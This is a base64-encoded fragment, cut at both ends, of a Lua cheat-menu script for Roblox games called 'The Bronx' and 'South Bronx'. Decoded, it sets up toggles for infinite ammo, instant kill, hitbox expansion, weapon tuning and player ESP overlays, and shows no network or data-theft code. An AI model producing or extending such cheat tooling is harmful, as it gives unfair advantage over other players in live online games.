luID0gMCwgbWF4ID0gMTAwLCBzdWZmaXggPSAiJSIsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlRoZUJyb254Lk1vZGlmaWNhdGlvbnMuU3ByZWFkUGVyY2VudGFnZSA9IHN0YXRlCiAgICAgICAgICAgICAgICBlbmR9KQoKICAgICAgICAgICAgICAgIEdlbmVyYWxTZWN0aW9uOnNsaWRlcih7bmFtZSA9ICJGaXJlIFJhdGUgUGVyY2VudGFnZSIsIGZsYWcgPSAiRmlyZVJhdGVTcGVlZF9UQjMiLCBkZWZhdWx0ID0gNTAsIG1pbiA9IDAsIG1heCA9IDEwMCwgc3VmZml4ID0gIiUiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICAgICAgICAgIENvbmZpZy5UaGVCcm9ueC5Nb2RpZmljYXRpb25zLkZpcmVSYXRlU3BlZWQgPSBzdGF0ZQogICAgICAgICAgICAgICAgZW5kfSkKCiAgICAgICAgICAgICAgICBHZW5lcmFsU2VjdGlvbjpzbGlkZXIoe25hbWUgPSAiUmVsb2FkIFNwZWVkIFBlcmNlbnRhZ2UiLCBmbGFnID0gIlJlbG9hZFNwZWVkX1RCMyIsIGRlZmF1bHQgPSA1MCwgbWluID0gMCwgbWF4ID0gMTAwLCBzdWZmaXggPSAiJSIsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlRoZUJyb254Lk1vZGlmaWNhdGlvbnMuUmVsb2FkU3BlZWQgPSBzdGF0ZQogICAgICAgICAgICAgICAgZW5kfSkKCiAgICAgICAgICAgICAgICBHZW5lcmFsU2VjdGlvbjpzbGlkZXIoe25hbWUgPSAiRXF1aXAgU3BlZWQgUGVyY2VudGFnZSIsIGZsYWcgPSAiRXF1aXBTcGVlZF9UQjMiLCBkZWZhdWx0ID0gNTAsIG1pbiA9IDAsIG1heCA9IDEwMCwgc3VmZml4ID0gIiUiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICAgICAgICAgIENvbmZpZy5UaGVCcm9ueC5Nb2RpZmljYXRpb25zLkVxdWlwU3BlZWQgPSBzdGF0ZQogICAgICAgICAgICAgICAgZW5kfSkKICAgICAgICAgICAgZW5kCgogICAgaWYgR2FtZV9OYW1lID09ICJUaGUgQnJvbngiIHRoZW4KICAgICAgICBsb2NhbCBoaXRib3h0YWIgPSB3aW5kb3c6dGFiKHtuYW1lID0gIkhpdGJveCBNb2RzIiwgdGFicyA9IHsiSGl0Ym94In0sIGljb24gPSBHZXRJbWFnZSgiV3JlbmNoLnBuZyIpfSkgZG8KICAgICAgICAgICAgbG9jYWwgaGl0Ym94Y29sdW1uID0gaGl0Ym94dGFiOmNvbHVtbih7fSkgZG8KICAgICAgICAgICAgICAgIGxvY2FsIGhpdGJveHNlY3Rpb24gPSBoaXRib3hjb2x1bW46c2VjdGlvbih7bmFtZSA9ICJIaXRib3ggTW9kaWZpY2F0aW9ucyIsIHNpZGUgPSAibGVmdCIsIHNpemUgPSAwLjR9KQoKICAgICAgICAgICAgICAgIGhpdGJveHNlY3Rpb246dG9nZ2xlKHtuYW1lID0gJ0VuYWJsZWQnLCBmbGFnID0gJ0hpdGJveGVzRW5hYmxlZCcsIHR5cGUgPSAndG9nZ2xlJywgZGVmYXVsdCA9IGZhbHNlLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICAgICAgICAgIENvbmZpZy5NaXNjU2V0dGluZ3MuSGl0Ym94X0V4cGFuZGVyLkVuYWJsZWQgPSBzdGF0ZQogICAgICAgICAgICAgICAgZW5kfSk6Y29sb3JwaWNrZXIoe2ZsYWcgPSAnSGl0Ym94ZXNDb2xvcicsIGNvbG9yID0gQ29sb3IzLm5ldygxLDEsMSksIGFscGhhID0gMSwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSwgYWxwaGEpCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLk1pc2NTZXR0aW5ncy5IaXRib3hfRXhwYW5kZXIuQ29sb3IgPSBzdGF0ZQogICAgICAgICAgICAgICAgICAgIENvbmZpZy5NaXNjU2V0dGluZ3MuSGl0Ym94X0V4cGFuZGVyLlRyYW5zcGFyZW5jeSA9IGFscGhhCiAgICAgICAgICAgICAgICBlbmR9KQoKICAgICAgICAgICAgICAgIGhpdGJveHNlY3Rpb246c2xpZGVyKHtuYW1lID0gIkhpdGJveCBNdWx0aXBsaWVyIiwgZmxhZyA9ICJIaXRCb3hfTXVsdGlwbGllciIsIG1pbiA9IDEsIG1heCA9IDIwLCBkZWZhdWx0ID0gMTAsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLk1pc2NTZXR0aW5ncy5IaXRib3hfRXhwYW5kZXIuTXVsdGlwbGllciA9IHN0YXRlCiAgICAgICAgICAgICAgICBlbmR9KQoKICAgICAgICAgICAgICAgIGhpdGJveHNlY3Rpb246ZHJvcGRvd24oe25hbWUgPSAiSGl0Ym94IFBhcnQiLCBmbGFnID0gIkhpdEJveFBhcnQiLCBpdGVtcyA9IHsiSGVhZCIsICJUb3JzbyJ9LCBkZWZhdWx0ID0gIlRvcnNvIiwgbXVsdGkgPSBmYWxzZSwgY2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKICAgICAgICAgICAgICAgICAgICBDb25maWcuTWlzY1NldHRpbmdzLkhpdGJveF9FeHBhbmRlci5QYXJ0ID0gKHZhbHVlID09ICJIZWFkIikgYW5kICJIZWFkIiBvciAiSHVtYW5vaWRSb290UGFydCIKICAgICAgICAgICAgICAgIGVuZH0pCgogICAgICAgICAgICAgICAgaGl0Ym94c2VjdGlvbjpkcm9wZG93bih7bmFtZSA9ICJIaXRib3ggTWF0ZXJpYWwiLCBmbGFnID0gIkhpdEJveE1hdGVyaWFsIiwgaXRlbXMgPSB7CiAgICAgICAgICAgICAgICAgICAgIlNtb290aFBsYXN0aWMiLCAiV29vZCIsICJTbGF0ZSIsICJDb25jcmV0ZSIsICJDb3Jyb2RlZE1ldGFsIiwKICAgICAgICAgICAgICAgICAgICAiTmVvbiIsICJHcmFzcyIsICJGYWJyaWMiLCAiRGlhbW9uZFBsYXRlIiwgIlNhbmRzdG9uZSIsCiAgICAgICAgICAgICAgICAgICAgIkljZSIsICJNYXJibGUiLCAiR3Jhbml0ZSIsICJQZWJibGUiLCAiTWV0YWwiLAogICAgICAgICAgICAgICAgICAgICJHbGFzcyIsICJQbGFzdGljIiwgIkZvcmNlRmllbGQiCiAgICAgICAgICAgICAgICB9LCBkZWZhdWx0ID0gIkZvcmNlRmllbGQiLCBtdWx0aSA9IGZhbHNlLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHZhbHVlKQogICAgICAgICAgICAgICAgICAgIENvbmZpZy5NaXNjU2V0dGluZ3MuSGl0Ym94X0V4cGFuZGVyLk1hdGVyaWFsID0gdmFsdWUKICAgICAgICAgICAgICAgIGVuZH0pCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCgogICAgaWYgR2FtZV9OYW1lID09ICJTb3V0aCBCcm9ueCIgYW5kIG5vdCBTb2xhcmEgdGhlbgogICAgICAgIGxvY2FsIFdlYXBvbk1vZFRhYiA9IHdpbmRvdzp0YWIoe25hbWUgPSAiTW9kaWZpY2F0aW9ucyIsIHRhYnMgPSB7IldlYXBvbiBNb2RpZmljYXRpb25zIn0sIGljb24gPSBHZXRJbWFnZSgiV3JlbmNoLnBuZyIpfSkgZG8KICAgICAgICAgICAgbG9jYWwgV2VhcG9uTW9kVGFiQ29sdW1uID0gV2VhcG9uTW9kVGFiOmNvbHVtbih7fSkgZG8KICAgICAgICAgICAgICAgIGxvY2FsIEdlbmVyYWxTZWN0aW9uID0gV2VhcG9uTW9kVGFiQ29sdW1uOnNlY3Rpb24oe25hbWUgPSAiV2VhcG9uIE1vZGlmaWNhdGlvbnMiLCBzaWRlID0gImxlZnQiLCBzaXplID0gMC41LCBpY29uID0gR2V0SW1hZ2UoIlBpc3RvbC5wbmciKX0pCgogICAgICAgICAgICAgICAgbG9jYWwgTW9kaWZpY2F0aW9ucyA9IHsKICAgICAgICAgICAgICAgICAgICAiSW5maW5pdGUgQW1tbyI7CiAgICAgICAgICAgICAgICAgICAgIkluc3RhbnQgS2lsbCI7CiAgICAgICAgICAgICAgICAgICAgIkZ1bGx5IEF1dG9tYXRpYyI7CiAgICAgICAgICAgICAgICAgICAgIkRpc2FibGUgSmFtbWluZyI7CiAgICAgICAgICAgICAgICAgICAgIk1vZGlmeSBSZWNvaWwgVmFsdWUiOwogICAgICAgICAgICAgICAgICAgICJNb2RpZnkgU3ByZWFkIFZhbHVlIjsKICAgICAgICAgICAgICAgICAgICAiTW9kaWZ5IFJlbG9hZCBTcGVlZCI7CiAgICAgICAgICAgICAgICAgICAgIk1vZGlmeSBFcXVpcCBTcGVlZCI7CiAgICAgICAgICAgICAgICAgICAgIk1vZGlmeSBGaXJlIFJhdGUiOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZvciBfLCBJbmRleCBpbiBNb2RpZmljYXRpb25zIGRvCiAgICAgICAgICAgICAgICAgICAgR2VuZXJhbFNlY3Rpb246dG9nZ2xlKHtuYW1lID0gSW5kZXgsIGZsYWcgPSBJbmRleC4uIl9UQjMiLCB0eXBlID0gInRvZ2dsZSIsIGRlZmF1bHQgPSBmYWxzZSwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgSW5kZXggPT0gIkZ1bGx5IEF1dG9tYXRpYyIgdGhlbiBJbmRleCA9ICJBdXRvbWF0aWMiIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBDb25maWcuU291dGhfQnJvbnguTW9kaWZpY2F0aW9uc1tJbmRleDpnc3ViKCIgIiwgIiIpXSA9IHN0YXRlCiAgICAgICAgICAgICAgICAgICAgZW5kfSkKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIEdlbmVyYWxTZWN0aW9uID0gV2VhcG9uTW9kVGFiQ29sdW1uOnNlY3Rpb24oe25hbWUgPSAiV2VhcG9uIE1vZGlmaWNhdGlvbnMiLCBzaWRlID0gImxlZnQiLCBzaXplID0gMC41LCBpY29uID0gR2V0SW1hZ2UoIlNldHRpbmdzLnBuZyIpfSkKCiAgICAgICAgICAgICAgICBHZW5lcmFsU2VjdGlvbjpzbGlkZXIoe25hbWUgPSAiUmVjb2lsIFBlcmNlbnRhZ2UiLCBmbGFnID0gIlJlY29pbFZhbHVlX1RCMyIsIGRlZmF1bHQgPSA1MCwgbWluID0gMCwgbWF4ID0gMTAwLCBzdWZmaXggPSAiJSIsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlNvdXRoX0Jyb254Lk1vZGlmaWNhdGlvbnMuUmVjb2lsUGVyY2VudGFnZSA9IHN0YXRlCiAgICAgICAgICAgICAgICBlbmR9KQoKICAgICAgICAgICAgICAgIEdlbmVyYWxTZWN0aW9uOnNsaWRlcih7bmFtZSA9ICJTcHJlYWQgUGVyY2VudGFnZSIsIGZsYWcgPSAiU3ByZWFkVmFsdWVfVEIzIiwgZGVmYXVsdCA9IDUwLCBtaW4gPSAwLCBtYXggPSAxMDAsIHN1ZmZpeCA9ICIlIiwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICBDb25maWcuU291dGhfQnJvbnguTW9kaWZpY2F0aW9ucy5TcHJlYWRQZXJjZW50YWdlID0gc3RhdGUKICAgICAgICAgICAgICAgIGVuZH0pCgogICAgICAgICAgICAgICAgR2VuZXJhbFNlY3Rpb246c2xpZGVyKHtuYW1lID0gIkZpcmUgUmF0ZSBQZXJjZW50YWdlIiwgZmxhZyA9ICJGaXJlUmF0ZVNwZWVkX1RCMyIsIGRlZmF1bHQgPSA1MCwgbWluID0gMCwgbWF4ID0gMTAwLCBzdWZmaXggPSAiJSIsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlNvdXRoX0Jyb254Lk1vZGlmaWNhdGlvbnMuRmlyZVJhdGVTcGVlZCA9IHN0YXRlCiAgICAgICAgICAgICAgICBlbmR9KQoKICAgICAgICAgICAgICAgIEdlbmVyYWxTZWN0aW9uOnNsaWRlcih7bmFtZSA9ICJSZWxvYWQgU3BlZWQgUGVyY2VudGFnZSIsIGZsYWcgPSAiUmVsb2FkU3BlZWRfVEIzIiwgZGVmYXVsdCA9IDUwLCBtaW4gPSAwLCBtYXggPSAxMDAsIHN1ZmZpeCA9ICIlIiwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgICAgICAgICBDb25maWcuU291dGhfQnJvbnguTW9kaWZpY2F0aW9ucy5SZWxvYWRTcGVlZCA9IHN0YXRlCiAgICAgICAgICAgICAgICBlbmR9KQoKICAgICAgICAgICAgICAgIEdlbmVyYWxTZWN0aW9uOnNsaWRlcih7bmFtZSA9ICJFcXVpcCBTcGVlZCBQZXJjZW50YWdlIiwgZmxhZyA9ICJFcXVpcFNwZWVkX1RCMyIsIGRlZmF1bHQgPSA1MCwgbWluID0gMCwgbWF4ID0gMTAwLCBzdWZmaXggPSAiJSIsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlNvdXRoX0Jyb254Lk1vZGlmaWNhdGlvbnMuRXF1aXBTcGVlZCA9IHN0YXRlCiAgICAgICAgICAgICAgICBlbmR9KQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAoKLS13aW5kb3c6c2VwZXJhdG9yKHtuYW1lID0gIiJ9KSBkbwogICAgbG9jYWwgVmlzdWFsc1RhYiA9IHdpbmRvdzp0YWIoe25hbWUgPSAiRVNQIiwgdGFicyA9IHsiUGxheWVycyJ9LCBpY29uID0gR2V0SW1hZ2UoIkVTUC5wbmciKX0pCgogICAgbG9jYWwgVmlzdWFsc0NvbHVtID0gVmlzdWFsc1RhYjpjb2x1bW4oe30pCiAgICBsb2NhbCBQbGF5ZXJWaXN1YWxzU2VjdGlvbiA9IFZpc3VhbHNDb2x1bTpzZWN0aW9uKHtuYW1lID0gIlBsYXllciBWaXN1YWxzIiwgc2lkZSA9ICJsZWZ0Iiwgc2l6ZSA9IDAuNzI1fSkKCiAgICBQbGF5ZXJWaXN1YWxzU2VjdGlvbjp0b2dnbGUoe25hbWUgPSAiRW5hYmxlZCIsIGZsYWcgPSAiUGxheWVyVmlzdWFsc19FbmFibGVkIiwgdHlwZSA9ICJ0b2dnbGUiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIENvbmZpZy5FU1AuRW5hYmxlZCA9IHN0YXRlCiAgICAgICAgUmVmcmVzaEFsbEVsZW1lbnRzKCkKICAgIGVuZH0pCgogICAgUGxheWVyVmlzdWFsc1NlY3Rpb246dG9nZ2xlKHtuYW1lID0gIkJvdW5kaW5nIEJveGVzIiwgZmxhZyA9ICJQbGF5ZXJWaXN1YWxzX0JvdW5kaW5nQm94ZXMiLCB0eXBlID0gInRvZ2dsZSIsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkJvdW5kaW5nLkVuYWJsZWQgPSBzdGF0ZQogICAgICAgIFJlZnJlc2hBbGxFbGVtZW50cygpCiAgICBlbmR9KTpjb2xvcnBpY2tlcih7ZmxhZyA9ICJQbGF5ZXJWaXN1YWxzX0JvdW5kaW5nQm94ZXNfQ29sb3IiLCBjb2xvciA9IENvbG9yMy5uZXcoMSwxLDEpLCBhbHBoYSA9IDEsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUsIGFscGhhKQogICAgICAgIENvbmZpZy5FU1AuRHJhd2luZy5Cb3hlcy5Cb3VuZGluZy5SR0IgPSBzdGF0ZQogICAgICAgIENvbmZpZy5FU1AuRHJhd2luZy5Cb3hlcy5Cb3VuZGluZy5UcmFuc3BhcmVuY3kgPSBhbHBoYQogICAgICAgIFJlZnJlc2hBbGxFbGVtZW50cygpCiAgICBlbmR9KQoKICAgIFBsYXllclZpc3VhbHNTZWN0aW9uOnRvZ2dsZSh7bmFtZSA9ICJDb3JuZXIgQm94ZXMiLCBmbGFnID0gIlBsYXllclZpc3VhbHNfQ29ybmVyQm94ZXMiLCB0eXBlID0gInRvZ2dsZSIsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkNvcm5lci5FbmFibGVkID0gc3RhdGUKICAgICAgICBSZWZyZXNoQWxsRWxlbWVudHMoKQogICAgZW5kfSk6Y29sb3JwaWNrZXIoe2ZsYWcgPSAiUGxheWVyVmlzdWFsc19Db3JuZXJCb3hlc19Db2xvciIsIGNvbG9yID0gQ29sb3IzLm5ldygxLDEsMSksIGFscGhhID0gMSwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSwgYWxwaGEpCiAgICAgICAgQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkNvcm5lci5SR0IgPSBzdGF0ZQogICAgICAgIENvbmZpZy5FU1AuRHJhd2luZy5Cb3hlcy5Db3JuZXIuVHJhbnNwYXJlbmN5ID0gYWxwaGEKICAgICAgICBSZWZyZXNoQWxsRWxlbWVudHMoKQogICAgZW5kfSkKCiAgICBsb2NhbCBfRmlsbGVkQm94ZXMgPSBQbGF5ZXJWaXN1YWxzU2VjdGlvbjp0b2dnbGUoe25hbWUgPSAiRmlsbGVkIEJveGVzIiwgZmxhZyA9ICJQbGF5ZXJWaXN1YWxzX0ZpbGxlZEJveGVzIiwgdHlwZSA9ICJ0b2dnbGUiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIENvbmZpZy5FU1AuRHJhd2luZy5Cb3hlcy5GaWxsZWQuRW5hYmxlZCA9IHN0YXRlCiAgICAgICAgUmVmcmVzaEFsbEVsZW1lbnRzKCkKICAgIGVuZH0pCgogICAgX0ZpbGxlZEJveGVzOmNvbG9ycGlja2VyKHtmbGFnID0gIlBsYXllclZpc3VhbHNfRmlsbGVkQm94ZXNfQ29sb3IxIiwgY29sb3IgPSBDb2xvcjMuZnJvbVJHQigxMTksIDEyMCwgMjU1KSwgYWxwaGEgPSAwLjI1LCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlLCBhbHBoYSkKICAgICAgICBDb25maWcuRVNQLkRyYXdpbmcuQm94ZXMuR3JhZGllbnRGaWxsUkdCMSA9IHN0YXRlCiAgICAgICAgQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkZpbGxlZC5UcmFuc3BhcmVuY3kgPSBhbHBoYQogICAgICAgIFJlZnJlc2hBbGxFbGVtZW50cygpCiAgICBlbmR9KQoKICAgIF9GaWxsZWRCb3hlczpjb2xvcnBpY2tlcih7ZmxhZyA9ICJQbGF5ZXJWaXN1YWxzX0ZpbGxlZEJveGVzX0NvbG9yMiIsIGNvbG9yID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCksIGFscGhhID0gMSwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSwgYWxwaGEpCiAgICAgICAgQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkdyYWRpZW50RmlsbFJHQjIgPSBzdGF0ZQogICAgICAgIFJlZnJlc2hBbGxFbGVtZW50cygpCiAgICBlbmR9KQoKICAgIFBsYXllclZpc3VhbHNTZWN0aW9uOnRvZ2dsZSh7bmFtZSA9ICJOYW1lcyIsIGZsYWcgPSAiUGxheWVyVmlzdWFsc19OYW1lcyIsIHR5cGUgPSAidG9nZ2xlIiwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBDb25maWcuRVNQLkRyYXdpbmcuTmFtZXMuRW5hYmxlZCA9IHN0YXRlCiAgICAgICAgUmVmcmVzaEFsbEVsZW1lbnRzKCkKICAgIGVuZH0pOmNvbG9ycGlja2VyKHtmbGFnID0gIlBsYXllclZpc3VhbHNfTmFtZXNfQ29sb3IiLCBjb2xvciA9IENvbG9yMy5uZXcoMSwxLDEpLCBhbHBoYSA9IDEsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUsIGFscGhhKQogICAgICAgIENvbmZpZy5FU1AuRHJhd2luZy5OYW1lcy5SR0IgPSBzdGF0ZQogICAgICAgIFJlZnJlc2hBbGxFbGVtZW50cygpCiAgICAgICAgQ29uZmlnLkVTUC5EcmF3aW5nLk5hbWVzLlRyYW5zcGFyZW5jeSA9IGFscGhhCiAgICAgICAgUmVmcmVzaEFsbEVsZW1lbnRzKCkKICAgIGVuZH0pCgogICAgbG9jYWwgSGVhbHRoQmFyX1RvZ2dsZSA9IFBsYXllclZpc3VhbHNTZWN0aW9uOnRvZ2dsZSh7bmFtZSA9ICJIZWFsdGggQmFycyIsIGZsYWcgPSAiUGxheWVyVmlzdWFsc19IZWFsdGhCYXJzIiwgdHlwZSA9ICJ0b2dnbGUiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIENvbmZpZy5FU1AuRHJhd2luZy5IZWFsdGhiYXIuRW5hYmxlZCA9IHN0YXRlCiAgICAgICAgUmVmcmVzaEFsbEVsZW1lbnRzKCkKICAgIGVuZH0pCgogICAgSGVhbHRoQmFyX1RvZ2dsZTpjb2xvcnBpY2tlcih7ZmxhZyA9ICJQbGF5ZXJWaXN1YWxzX0hlYWx0aEJhcl9IaWdoX0NvbG9yIiwgY29sb3IgPSBDb2xvcjMubmV3KDAsIDEsIDApLCBhbHBoYSA9IDEsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUsIGFscGhhKQogICAgICAgIENvbmZpZy5FU1AuRHJhd2luZy5IZWFsdGhiYXIuR3JhZGllbnRSR0IyID0gc3RhdGUKICAgICAgICBSZWZyZXNoQWxsRWxlbWVudHMoKQogICAgZW5kfSkKCiAgICBIZWFsdGhCYXJfVG9nZ2xlOmNvbG9ycGlja2VyKHtmbGFnID0gIlBsYXllclZpc3VhbHNfSGVhbHRoQmFyX0xvd19Db2xvciIsIGNvbG9yID0gQ29sb3IzLm5ldygxLCAwLCAwKSwgYWxwaGEgPSAxLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlLCBhbHBoYSkKICAgICAgICBDb25maWcuRVNQLkRyYXdpbmcuSGVhbHRoYmFyLkdyYWRpZW50UkdCMSA9IHN0YXRlCiAgICAgICAgUmVmcmVzaEFsbEVsZW1lbnRzKCkKICAgIGVuZH0pCgogICAgUGxheWVyVmlzdWFsc1NlY3Rpb246dG9nZ2xlKHtuYW1lID0gIkhlYWx0aCBUZXh0IiwgZmxhZyA9ICJQbGF5ZXJWaXN1YWxzX0hlYWx0aFRleHQiLCB0eXBlID0gInRvZ2dsZSIsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgQ29uZmlnLkVTUC5EcmF3aW5nLkhlYWx0aGJhci5IZWFsdGhUZXh0ID0gc3RhdGUKICAgICAgICBSZWZyZXNoQWxsRWxlbWVudHMoKQogICAgZW5kfSkKCiAgICBQbGF5ZXJWaXN1YWxzU2VjdGlvbjp0b2dnbGUoe25hbWUgPSAiV2VhcG9ucyIsIGZsYWcgPSAiUGxheWVyVmlzdWFsc19XZWFwb25zIiwgdHlwZSA9ICJ0b2dnbGUiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIENvbmZpZy5FU1AuRHJhd2luZy5XZWFwb25zLkVuYWJsZWQgPSBzdGF0ZQogICAgICAgIFJlZnJlc2hBbGxFbGVtZW50cygpCiAgICBlbmR9KTpjb2xvcnBpY2tlcih7ZmxhZyA9ICJQbGF5ZXJWaXN1YWxzX1dlYXBvbnNfQ29sb3IiLCBjb2xvciA9IENvbG9yMy5uZXcoMSwxLDEpLCBhbHBoYSA9IDEsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUsIGFscGhhKQogICAgICAgIENvbmZpZy5FU1AuRHJhd2luZy5XZWFwb25zLldlYXBvblRleHRSR0IgPSBzdGF0ZQogICAgICAgIENvbmZpZy5FU1AuRHJhd2luZy5XZWFwb25zLlRyYW5zcGFyZW5jeSA9IGFscGhhCiAgICAgICAgUmVmcmVzaEFsbEVsZW1lbnRzKCkKICAgIGVuZH0pCgogICAgUGxheWVyVmlzdWFsc1NlY3Rpb246dG9nZ2xlKHtuYW1lID0gIkRpc3RhbmNlIiwgZmxhZyA9ICJQbGF5ZXJWaXN1YWxzX0Rpc3RhbmNlIiwgdHlwZSA9ICJ0b2dnbGUiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIENvbmZpZy5FU1AuRHJhd2luZy5EaXN0YW5jZXMuRW5hYmxlZCA9IHN0YXRlCiAgICAgICAgUmVmcmVzaEFsbEVsZW1lbnRzKCkKICAgIGVuZH0pOmNvbG9ycGlja2VyKHtmbGFnID0gIlBsYXllclZpc3VhbHNfRGlzdGFuY2VfQ29sb3IiLCBjb2xvciA9IENvbG9yMy5uZXcoMSwxLDEpLCBhbHBoYSA9IDEsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUsIGFscGhhKQogICAgICAgIENvbmZpZy5FU1AuRHJhd2luZy5EaXN0YW5jZXMuUkdCID0gc3RhdGUKICAgICAgICBDb25maWcuRVNQLkRyYXdpbmcuRGlzdGFuY2VzLlRyYW5zcGFyZW5jeSA9IGFscGhhCiAgICAgICAgUmVmcmVzaEFsbEVsZW1lbnRzKCkKICAgIGVuZH0pCgogICAgbG9jYWwgX0NoYW1zVG9nZ2xlID0gUGxheWVyVmlzdWFsc1NlY3Rpb246dG9nZ2xlKHtuYW1lID0gIkNoYW1zIiwgZmxhZyA9ICJQbGF5ZXJWaXN1YWxzX0NoYW1zIiwgdHlwZSA9ICJ0b2dnbGUiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIENvbmZpZy5FU1AuRHJhd2luZy5DaGFtcy5FbmFibGVkID0gc3RhdGUKICAgICAgICBSZWZyZXNoQWxsRWxlbWVudHMoKQogICAgZW5kfSkKCiAgICBfQ2hhbXNUb2dnbGU6Y29sb3JwaWNrZXIoe2ZsYWcgPSAiUGxheWVyVmlzdWFsc19DaGFtc19Db2xvcjEiLCBjb2xvciA9IENvbG9yMy5mcm9tUkdCKDExOSwgMTIwLCAyNTUpLCBhbHBoYSA9IDAuOCwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSwgYWxwaGEpCiAgICAgICAgQ29uZmlnLkVTUC5EcmF3aW5nLkNoYW1zLkZpbGxSR0IgPSBzdGF0ZQogICAgICAgIENvbmZpZy5FU1AuRHJhd2luZy5EaXN0YW5jZXMuRmlsbF9UcmFuc3BhcmVuY3kgPSBhbHBoYSoxMDAKICAgICAgICBSZWZyZXNoQWxsRWxlbWVudHMoKQogICAgZW5kfSkKCiAgICBfQ2hhbXNUb2dnbGU6Y29sb3JwaWNrZXIoe2ZsYWcgPSAiUGxheWVyVmlzdWFsc19DaGFtc19Db2xvcjIiLCBjb2xvciA9IENvbG9yMy5uZXcoMCwwLDApLCBhbHBoYSA9IDEsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUsIGFscGhhKQogICAgICAgIENvbmZpZy5FU1AuRHJhd2luZy5DaGFtcy5PdXRsaW5lUkdCID0gc3RhdGUKICAgICAgICBDb25maWcuRVNQLkRyYXdpbmcuRGlzdGFuY2VzLk91dGxpbmVfVHJhbnNwYXJlbmN5ID0gYWxwaGEqMTAwCiAgICAgICAgUmVmcmVzaEFsbEVsZW1lbnRzKCkKICAgIGVuZH0pCgogICAgVmlzdWFsc0NvbHVtID0gVmlzdWFsc1RhYjpjb2x1bW4oe30pCiAgICBsb2NhbCBQbGF5ZXJWaXN1YWxzU2V0dGluZ3NTZWN0aW9uID0gVmlzdWFsc0NvbHVtOnNlY3Rpb24oe25hbWUgPSAiUGxheWVyIFZpc3VhbCBTZXR0aW5ncyIsIHNpZGUgPSAibGVmdCIsIHNpemUgPSAwLjcsIGljb24gPSBHZXRJbWFnZSgiU2V0dGluZ3MucG5nIil9KQoKICAgIFBsYXllclZpc3VhbHNTZXR0aW5nc1NlY3Rpb246dG9nZ2xlKHtuYW1lID0gIkFuaW1hdGVkIEJveGVzIiwgZmxhZyA9ICJWaXN1YWxzX0FuaW1hdGVkQm94IiwgZGVmYXVsdCA9IGZhbHNlLCB0eXBlID0gInRvZ2dsZSIsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgQ29uZmlnLkVTUC5EcmF3aW5nLkJveGVzLkFuaW1hdGUgPSBzdGF0ZQogICAgICAgIFJlZnJlc2hBbGxFbGVtZW50cygpCiAgICBlbmR9KQoKICAgIFBsYXllclZpc3VhbHNTZXR0aW5nc1NlY3Rpb246dG9nZ2xlKHtuYW1lID0gIkR5bmFtaWMgSGVhbHRoIFRleHQiLCBmbGFnID0gIlZpc3VhbHNfSGVhbHRoVGV4dExlcnAiLCBkZWZhdWx0ID0gdHJ1ZSwgdHlwZSA9ICJ0b2dnbGUiLCBjYWxsYmFj